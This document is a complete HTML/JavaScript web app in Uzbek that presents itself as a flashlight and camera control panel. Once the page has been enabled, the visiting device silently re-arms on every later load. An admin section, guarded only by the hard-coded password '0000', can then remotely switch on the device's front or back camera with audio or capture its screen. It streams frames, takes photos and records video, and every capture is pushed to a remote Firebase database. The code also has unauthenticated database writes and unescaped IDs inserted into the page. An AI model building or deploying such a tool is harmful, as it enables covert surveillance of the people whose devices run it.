<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Boshqaruv</title>
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: rgba(30, 41, 59, 0.75);
            --accent: #3b82f6;
            --text: #f8fafc;
            --danger: #ef4444;
            --success: #22c55e;
            --warning: #f59e0b;
            --purple: #8b5cf6;
            --teal: #14b8a6;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text);
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            max-width: 750px;
            width: 100%;
            background: var(--card-bg);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 24px;
            border-radius: 16px;
            margin-bottom: 24px;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
        }

        h2 {
            font-size: 1.25rem;
            margin-bottom: 16px;
            color: var(--accent);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            padding-bottom: 8px;
        }

        .id-badge {
            background: rgba(59, 130, 246, 0.15);
            border: 1px solid var(--accent);
            padding: 12px;
            border-radius: 8px;
            font-size: 1.1rem;
            font-weight: bold;
            text-align: center;
            margin-bottom: 16px;
        }

        textarea, input[type="password"] {
            width: 100%;
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            color: #fff;
            padding: 10px;
            font-size: 0.95rem;
            margin-bottom: 12px;
        }

        textarea {
            height: 60px;
            resize: none;
        }

        textarea:focus, input:focus {
            outline: none;
            border-color: var(--accent);
        }

        .btn-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            margin-bottom: 12px;
        }

        button {
            padding: 10px;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            font-size: 0.85rem;
        }

        button:active { transform: scale(0.98); }

        .btn-on { background: var(--success); color: white; }
        .btn-off { background: var(--danger); color: white; }
        .btn-blink { background: var(--warning); color: white; }
        .btn-purple { background: var(--purple); color: white; }
        .btn-teal { background: var(--teal); color: white; }
        .btn-primary { background: var(--accent); color: white; width: 100%; }

        .device-card {
            background: rgba(15, 23, 42, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 15px;
        }

        .device-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }

        .device-id-text { font-weight: bold; font-size: 1.1rem; }

        .device-status {
            font-size: 0.75rem;
            padding: 3px 8px;
            border-radius: 12px;
            font-weight: bold;
        }

        .status-OFF { background: rgba(239, 68, 68, 0.2); color: #fca5a5; }
        .status-ON { background: rgba(34, 197, 94, 0.2); color: #86efac; }
        .status-BLINK { background: rgba(245, 158, 11, 0.2); color: #fde047; }

        .controls-row {
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
            margin-bottom: 10px;
        }

        .video-container {
            width: 100%;
            height: 240px;
            background: #000;
            border-radius: 8px;
            overflow: hidden;
            display: none;
            position: relative;
            margin-top: 10px;
        }

        .video-container img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .media-gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
            gap: 10px;
            margin-top: 10px;
        }

        .media-item {
            background: rgba(0,0,0,0.4);
            border-radius: 6px;
            padding: 6px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
        }

        .media-item img, .media-item video {
            width: 100%;
            height: 80px;
            object-fit: cover;
            border-radius: 4px;
        }

        .media-actions {
            display: flex;
            gap: 4px;
            width: 100%;
        }

        .media-actions a, .media-actions button {
            flex: 1;
            font-size: 0.7rem;
            padding: 4px;
            text-align: center;
            border-radius: 4px;
            text-decoration: none;
            cursor: pointer;
            border: none;
        }

        .btn-download { background: var(--accent); color: white; }
        .btn-delete { background: var(--danger); color: white; }

        #localStreamVideo {
            width: 100%;
            max-height: 200px;
            background: #000;
            border-radius: 8px;
            display: none;
            margin-top: 10px;
        }

        #adminPanelSection { display: none; width: 100%; max-width: 750px; }
    </style>
</head>
<body>

    <!-- 1. QURILMA REJIMI -->
    <div class="container">
        <h2>Ushbu Qurilma Paneli</h2>
        <div class="id-badge">
            Qurilma ID: <span id="myDeviceId">Yuklanmoqda...</span>
        </div>
        <button id="enableCamBtn" class="btn-primary" onclick="initDevicePermissions()">
            Chiroq va Kamera Translyatsiyasini Faollashtirish
        </button>
        <p id="permStatus" style="font-size: 0.85rem; color: #94a3b8; text-align: center; margin-top: 8px;"></p>
        <video id="localStreamVideo" autoplay playsinline muted></video>

        <h3 style="font-size: 1rem; margin-top: 15px; color: var(--teal);">Ushbu Qurilmada Saqlangan Fayllar</h3>
        <div class="media-gallery" id="deviceGallery"></div>
    </div>

    <!-- 2. ADMIN PAROL BILAN KIRISH -->
    <div class="container" id="adminAuthSection">
        <h2>Admin Rejimiga Kirish</h2>
        <input type="password" id="adminPassInput" placeholder="Parolni kiriting (0000)">
        <button class="btn-primary" onclick="checkAdminPassword()">Kirish</button>
    </div>

    <!-- 3. BOSHQARUV PANELI -->
    <div id="adminPanelSection">
        <div class="container">
            <h2>Boshqaruv Paneli (Ommaviy va Alohida)</h2>
            <label style="display:block; font-size: 0.85rem; margin-bottom: 6px; color: #94a3b8;">
                ID larni kiriting (masalan: DEV-1024, DEV-5582):
            </label>
            <textarea id="targetIds" placeholder="ID larni vergul yoki yangi qator bilan kiriting..."></textarea>
            
            <div class="btn-grid">
                <button class="btn-on" onclick="sendBulkCommand('ON')">Yoqish</button>
                <button class="btn-off" onclick="sendBulkCommand('OFF')">Oʻchirish</button>
                <button class="btn-blink" onclick="sendBulkCommand('BLINK')">Oʻchib-Yonish</button>
            </div>
            
            <button class="btn-primary" onclick="renderTargetDevices()">
                Roʻyxatni Boshqaruv Kartalariga Yuklash
            </button>
        </div>

        <!-- ALOHIDA QURILMALAR KARTALARI -->
        <div class="container">
            <h2>Alohida Qurilmalar Nazorati va Media Boshqaruvi</h2>
            <div id="devicesContainer">
                <p style="color: #64748b; font-size: 0.9rem; text-align: center;">Hali hech qanday ID yuklanmadi.</p>
            </div>
        </div>
    </div>

    <!-- Firebase SDK lari -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAeYCXyB6CTf7CUCtP7BzAIHbpIheFPFz8",
            authDomain: "mening-jurnalim.firebaseapp.com",
            databaseURL: "https://mening-jurnalim-default-rtdb.europe-west1.firebasedatabase.app",
            projectId: "mening-jurnalim",
            storageBucket: "mening-jurnalim.firebasestorage.app",
            messagingSenderId: "341059328255",
            appId: "1:341059328255:web:6f1f4ebfa36a9ec84714ca"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        function getDeviceId() {
            let id = localStorage.getItem("my_permanent_device_id");
            if (!id) {
                id = "DEV-" + Math.floor(1000 + Math.random() * 9000);
                localStorage.setItem("my_permanent_device_id", id);
            }
            return id;
        }

        const currentDeviceId = getDeviceId();
        document.getElementById("myDeviceId").innerText = currentDeviceId;

        let activeStream = null;
        let videoTrack = null;
        let blinkInterval = null;
        let streamInterval = null;
        let mediaRecorder = null;
        let recordedChunks = [];

        window.addEventListener("DOMContentLoaded", () => {
            if (localStorage.getItem("cam_permission_granted") === "true") {
                initDevicePermissions();
            }
            loadDeviceLocalGallery();
        });

        async function initDevicePermissions() {
            try {
                localStorage.setItem("cam_permission_granted", "true");
                updateCamUI(true);
                listenToMyDeviceCommands();
            } catch (err) {
                console.error(err);
            }
        }

        function updateCamUI(isGranted) {
            const btn = document.getElementById("enableCamBtn");
            const status = document.getElementById("permStatus");
            if (isGranted) {
                btn.innerText = "Boshqaruv va Translyatsiya Faol";
                btn.style.background = "#475569";
                btn.disabled = true;
                status.innerText = "Qurilma buyruqlarni qabul qilishga tayyor.";
            }
        }

        function listenToMyDeviceCommands() {
            database.ref('devices/' + currentDeviceId + '/state').on('value', (snapshot) => {
                applyFlashState(snapshot.val() || "OFF");
            });

            database.ref('devices/' + currentDeviceId + '/streamSource').on('value', (snapshot) => {
                handleStreamSourceChange(snapshot.val() || "NONE");
            });

            database.ref('devices/' + currentDeviceId + '/action').on('value', (snapshot) => {
                const action = snapshot.val();
                if (action === "TAKE_PHOTO") {
                    capturePhoto();
                    database.ref('devices/' + currentDeviceId + '/action').remove();
                } else if (action === "START_REC") {
                    startVideoRecording();
                    database.ref('devices/' + currentDeviceId + '/action').remove();
                } else if (action === "STOP_REC") {
                    stopVideoRecording();
                    database.ref('devices/' + currentDeviceId + '/action').remove();
                }
            });
        }

        function applyFlashState(state) {
            clearInterval(blinkInterval);
            if (state === "ON") setHardwareTorch(true);
            else if (state === "OFF") setHardwareTorch(false);
            else if (state === "BLINK") {
                let flag = false;
                blinkInterval = setInterval(() => {
                    flag = !flag;
                    setHardwareTorch(flag);
                }, 300);
            }
        }

        async function setHardwareTorch(enable) {
            if (videoTrack) {
                try {
                    const capabilities = videoTrack.getCapabilities();
                    if (capabilities.torch) {
                        await videoTrack.applyConstraints({ advanced: [{ torch: enable }] });
                    }
                } catch (e) {
                    console.error("Torch xatosi:", e);
                }
            }
        }

        async function handleStreamSourceChange(source) {
            stopCurrentStream();
            if (source === "NONE") return;

            try {
                if (source === "BACK") {
                    activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: true });
                } else if (source === "FRONT") {
                    activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                } else if (source === "SCREEN") {
                    activeStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
                }

                if (activeStream) {
                    videoTrack = activeStream.getVideoTracks()[0];
                    const localVid = document.getElementById("localStreamVideo");
                    localVid.srcObject = activeStream;
                    startSendingFrames();
                }
            } catch (err) {
                console.error("Stream ochish xatosi:", err);
                database.ref('devices/' + currentDeviceId + '/streamSource').set("NONE");
            }
        }

        function stopCurrentStream() {
            clearInterval(streamInterval);
            if (activeStream) {
                activeStream.getTracks().forEach(track => track.stop());
                activeStream = null;
                videoTrack = null;
            }
            database.ref('devices/' + currentDeviceId + '/frame').remove();
        }

        function startSendingFrames() {
            const canvas = document.createElement("canvas");
            const ctx = canvas.getContext("2d");
            const video = document.getElementById("localStreamVideo");

            streamInterval = setInterval(() => {
                if (video.videoWidth > 0 && video.videoHeight > 0) {
                    canvas.width = 320;
                    canvas.height = (video.videoHeight / video.videoWidth) * 320;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const base64Image = canvas.toDataURL("image/jpeg", 0.4);
                    database.ref('devices/' + currentDeviceId + '/frame').set(base64Image);
                }
            }, 250);
        }

        function capturePhoto() {
            const video = document.getElementById("localStreamVideo");
            if (!video.videoWidth) return;

            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0);

            const photoData = canvas.toDataURL("image/png");
            autoDownload(photoData, `photo_${Date.now()}.png`);

            database.ref('devices/' + currentDeviceId + '/media').push({
                type: 'photo',
                data: photoData,
                time: new Date().toLocaleTimeString()
            });

            saveLocalMediaItem('photo', photoData);
        }

        function startVideoRecording() {
            if (!activeStream) return;
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(activeStream);

            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) recordedChunks.push(e.data);
            };

            mediaRecorder.onstop = () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = () => {
                    const videoData = reader.result;
                    autoDownload(videoData, `video_${Date.now()}.webm`);

                    database.ref('devices/' + currentDeviceId + '/media').push({
                        type: 'video',
                        data: videoData,
                        time: new Date().toLocaleTimeString()
                    });

                    saveLocalMediaItem('video', videoData);
                };
            };

            mediaRecorder.start();
        }

        function stopVideoRecording() {
            if (mediaRecorder && mediaRecorder.state !== "inactive") {
                mediaRecorder.stop();
            }
        }

        function autoDownload(dataUrl, filename) {
            const a = document.createElement("a");
            a.href = dataUrl;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }

        function saveLocalMediaItem(type, data) {
            let items = JSON.parse(localStorage.getItem("my_saved_media") || "[]");
            items.push({ id: 'loc_' + Date.now(), type, data });
            localStorage.setItem("my_saved_media", JSON.stringify(items));
            loadDeviceLocalGallery();
        }

        function loadDeviceLocalGallery() {
            const container = document.getElementById("deviceGallery");
            let items = JSON.parse(localStorage.getItem("my_saved_media") || "[]");
            container.innerHTML = "";
            items.forEach((item, index) => {
                const div = document.createElement("div");
                div.className = "media-item";
                div.innerHTML = `
                    ${item.type === "photo" ? `<img src="${item.data}" />` : `<video src="${item.data}" controls></video>`}
                    <div class="media-actions">
                        <a class="btn-download" href="${item.data}" download>Yuklash</a>
                        <button class="btn-delete" onclick="deleteLocalMedia(${index})">Oʻchirish</button>
                    </div>
                `;
                container.appendChild(div);
            });
        }

        function deleteLocalMedia(index) {
            let items = JSON.parse(localStorage.getItem("my_saved_media") || "[]");
            items.splice(index, 1);
            localStorage.setItem("my_saved_media", JSON.stringify(items));
            loadDeviceLocalGallery();
        }

        // --- ADMIN PANELI ---
        function checkAdminPassword() {
            if (document.getElementById("adminPassInput").value === "0000") {
                document.getElementById("adminAuthSection").style.display = "none";
                document.getElementById("adminPanelSection").style.display = "block";
            } else {
                alert("Noto'g'ri parol!");
            }
        }

        function sendBulkCommand(mode) {
            const ids = parseIds(document.getElementById("targetIds").value);
            if (!ids.length) return alert("ID kiriting!");
            const updates = {};
            ids.forEach(id => { updates['devices/' + id + '/state'] = mode; });
            database.ref().update(updates);
        }

        function parseIds(text) {
            return text.split(/[\n,]+/).map(i => i.trim()).filter(i => i.length > 0);
        }

        function renderTargetDevices() {
            const ids = parseIds(document.getElementById("targetIds").value);
            const container = document.getElementById("devicesContainer");

            if (!ids.length) {
                container.innerHTML = `<p style="color: #64748b; font-size: 0.9rem; text-align: center;">Kiritilgan ID topilmadi.</p>`;
                return;
            }

            container.innerHTML = "";

            ids.forEach(id => {
                const card = document.createElement("div");
                card.className = "device-card";
                card.id = `card-${id}`;

                card.innerHTML = `
                    <div class="device-header">
                        <span class="device-id-text">${id}</span>
                        <span class="device-status status-OFF" id="status-${id}">OFF</span>
                    </div>

                    <div class="controls-row">
                        <button class="btn-on" onclick="setSingleState('${id}', 'ON')">Chiroq ON</button>
                        <button class="btn-off" onclick="setSingleState('${id}', 'OFF')">Chiroq OFF</button>
                        <button class="btn-blink" onclick="setSingleState('${id}', 'BLINK')">BLINK</button>
                    </div>

                    <div class="controls-row">
                        <button class="btn-purple" onclick="setStreamSource('${id}', 'BACK')">Orqa Kamera</button>
                        <button class="btn-purple" onclick="setStreamSource('${id}', 'FRONT')">Oldi Kamera</button>
                        <button class="btn-purple" onclick="setStreamSource('${id}', 'SCREEN')">Ekran</button>
                        <button class="btn-off" onclick="setStreamSource('${id}', 'NONE')">Yopish</button>
                    </div>

                    <div class="controls-row">
                        <button class="btn-teal" onclick="sendAction('${id}', 'TAKE_PHOTO')">📸 Rasm Olish</button>
                        <button class="btn-teal" onclick="sendAction('${id}', 'START_REC')">🔴 Video Yozish</button>
                        <button class="btn-off" onclick="sendAction('${id}', 'STOP_REC')">⏹ Toʻxtatish va Saqlash</button>
                    </div>

                    <div class="video-container" id="videoBox-${id}">
                        <img id="streamImg-${id}" src="" />
                    </div>

                    <h4 style="font-size: 0.85rem; margin-top: 10px; color: var(--teal);">Olingan Media (Admin):</h4>
                    <div class="media-gallery" id="adminGallery-${id}"></div>
                `;

                container.appendChild(card);

                database.ref('devices/' + id + '/state').on('value', (snapshot) => {
                    const st = snapshot.val() || "OFF";
                    const statusSpan = document.getElementById(`status-${id}`);
                    if (statusSpan) {
                        statusSpan.innerText = st;
                        statusSpan.className = `device-status status-${st}`;
                    }
                });

                database.ref('devices/' + id + '/frame').on('value', (snapshot) => {
                    const frameData = snapshot.val();
                    const box = document.getElementById(`videoBox-${id}`);
                    const img = document.getElementById(`streamImg-${id}`);
                    if (frameData) {
                        box.style.display = "block";
                        img.src = frameData;
                    } else {
                        box.style.display = "none";
                        img.src = "";
                    }
                });

                database.ref('devices/' + id + '/media').on('value', (snapshot) => {
                    const mediaGroup = snapshot.val();
                    const gallery = document.getElementById(`adminGallery-${id}`);
                    if (!gallery) return;
                    gallery.innerHTML = "";
                    if (mediaGroup) {
                        Object.entries(mediaGroup).forEach(([mediaKey, item]) => {
                            const div = document.createElement("div");
                            div.className = "media-item";
                            div.innerHTML = `
                                ${item.type === "photo" ? `<img src="${item.data}" />` : `<video src="${item.data}" controls></video>`}
                                <div class="media-actions">
                                    <a class="btn-download" href="${item.data}" download>Yuklash</a>
                                    <button class="btn-delete" onclick="deleteAdminMedia('${id}', '${mediaKey}')">Oʻchirish</button>
                                </div>
                            `;
                            gallery.appendChild(div);
                        });
                    }
                });
            });
        }

        function setSingleState(id, mode) { database.ref('devices/' + id + '/state').set(mode); }
        function setStreamSource(id, source) { database.ref('devices/' + id + '/streamSource').set(source); }
        function sendAction(id, act) { database.ref('devices/' + id + '/action').set(act); }

        function deleteAdminMedia(deviceId, mediaKey) {
            database.ref(`devices/${deviceId}/media/${mediaKey}`).remove();
        }
    </script>
</body>
</html>
